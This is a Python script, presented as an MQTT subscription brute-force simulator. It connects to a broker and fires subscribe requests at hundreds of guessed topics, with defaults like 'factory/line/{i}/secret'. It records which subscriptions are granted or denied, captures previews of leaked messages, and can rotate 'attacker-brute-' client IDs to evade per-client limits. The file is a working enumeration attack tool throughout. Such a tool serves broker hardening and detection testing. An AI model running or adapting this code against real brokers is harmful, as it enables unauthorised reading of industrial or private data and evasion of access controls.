"""MQTT subscription brute-force simulator."""

import argparse
import csv
import os
import threading
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt


def load_topics(args):
    if args.topics_file:
        with open(args.topics_file, "r", encoding="utf-8") as handle:
            topics = [line.strip() for line in handle.readlines() if line.strip()]
        return topics
    return [args.topic_template.format(i=i) for i in range(args.topic_count)]


class BruteForceSession:
    def __init__(self, args, topics):
        self.args = args
        self.topics = topics
        self.stop_event = threading.Event()
        self.log_writer, self.log_handle = self._prep_log(args.log_csv)
        self.log_lock = threading.Lock()
        self.pending = {}

    @staticmethod
    def _prep_log(path):
        if not path:
            return None, None
        exists = os.path.exists(path)
        handle = open(path, "a", newline="", encoding="utf-8")
        writer = csv.writer(handle)
        if not exists:
            writer.writerow(["timestamp_utc", "event", "client_id", "topic", "status", "detail", "latency_ms"])
        return writer, handle

    def close(self):
        if self.log_handle:
            self.log_handle.flush()
            self.log_handle.close()

    def log(self, event, client_id, topic, status, detail, started=None):
        if not self.log_writer:
            return
        latency = ""
        if started is not None:
            latency = f"{(time.time() - started) * 1000:.2f}"
        with self.log_lock:
            self.log_writer.writerow([datetime.now(timezone.utc).isoformat(), event, client_id, topic, status, detail, latency])

    def create_client(self, seq: int):
        client_id = f"{self.args.client_prefix}{seq:03d}"
        client = mqtt.Client(client_id=client_id, clean_session=True)
        if self.args.username:
            client.username_pw_set(self.args.username, self.args.password)
        client.user_data_set(self)
        client.on_connect = self.on_connect
        client.on_disconnect = self.on_disconnect
        client.on_subscribe = self.on_subscribe
        client.on_message = self.on_message
        return client, client_id

    def on_connect(self, client, userdata, flags, rc):  # pragma: no cover - network specific
        print(f"[connect] client={client._client_id.decode()} rc={rc}")

    def on_disconnect(self, client, userdata, rc):  # pragma: no cover - network specific
        print(f"[disconnect] client={client._client_id.decode()} rc={rc}")

    def on_subscribe(self, client, userdata, mid, granted_qos):  # pragma: no cover - network specific
        info = self.pending.pop(mid, None)
        qos_display = ",".join(str(q) for q in granted_qos)
        if not info:
            print(f"[suback] mid={mid} qos={qos_display} (unknown topic)")
            return
        topic, started, client_id = info
        status = "granted"
        detail = qos_display
        if granted_qos and granted_qos[0] == 0x80:
            status = "denied"
        print(f"[suback] client={client_id} topic={topic} status={status} qos={qos_display}")
        self.log("suback", client_id, topic, status, detail, started)

    def on_message(self, client, userdata, msg):  # pragma: no cover - network specific
        client_id = client._client_id.decode()
        preview = msg.payload[:64]
        try:
            payload_text = preview.decode("utf-8", errors="replace")
        except AttributeError:
            payload_text = str(preview)
        print(f"[message] client={client_id} topic={msg.topic} len={len(msg.payload)}")
        self.log("message", client_id, msg.topic, "received", payload_text)


def main():
    parser = argparse.ArgumentParser(description="MQTT subscribe brute-force simulator")
    parser.add_argument("--broker", default="localhost")
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--keepalive", type=int, default=30)
    parser.add_argument("--username")
    parser.add_argument("--password")
    parser.add_argument("--client-prefix", default="attacker-brute-")
    parser.add_argument("--topics-file", help="file containing target topics (one per line)")
    parser.add_argument("--topic-template", default="factory/line/{i}/secret")
    parser.add_argument("--topic-count", type=int, default=500)
    parser.add_argument("--qos", type=int, default=0)
    parser.add_argument("--rate", type=float, default=20.0, help="subscribe requests per second")
    parser.add_argument("--rotate-every", type=int, default=0, help="rotate client id after this many subscriptions (0 disables)")
    parser.add_argument("--duration", type=float, default=0.0, help="optional stop after seconds")
    parser.add_argument("--log-csv", help="path to append brute-force log")
    args = parser.parse_args()

    topics = load_topics(args)
    if not topics:
        print("no topics supplied")
        return

    session = BruteForceSession(args, topics)

    client_seq = 0
    current_client = None
    current_client_id = ""

    def start_new_client():
        nonlocal current_client, current_client_id, client_seq
        if current_client:
            current_client.loop_stop()
            current_client.disconnect()
        client_seq += 1
        current_client, current_client_id = session.create_client(client_seq)
        try:
            current_client.connect(args.broker, args.port, args.keepalive)
        except Exception as exc:  # pragma: no cover - network specific
            print(f"failed to connect {current_client_id}: {exc}")
            return False
        current_client.loop_start()
        return True

    if not start_new_client():
        session.close()
        return

    start_time = time.time()
    interval = 1.0 / args.rate if args.rate > 0 else 0.0

    try:
        for idx, topic in enumerate(topics, start=1):
            if session.stop_event.is_set():
                break
            if args.duration > 0 and (time.time() - start_time) >= args.duration:
                break
            if args.rotate_every and idx != 0 and idx % args.rotate_every == 0:
                if not start_new_client():
                    break
            result, mid = current_client.subscribe(topic, qos=args.qos)
            if result != mqtt.MQTT_ERR_SUCCESS:
                print(f"[subscribe] error {result} for topic {topic}")
                session.log("subscribe", current_client_id, topic, "error", str(result))
            else:
                session.pending[mid] = (topic, time.time(), current_client_id)
            if interval > 0:
                time.sleep(interval)
    except KeyboardInterrupt:
        pass

    session.stop_event.set()
    if current_client:
        current_client.loop_stop()
        current_client.disconnect()
    session.close()


if __name__ == "__main__":
    main()
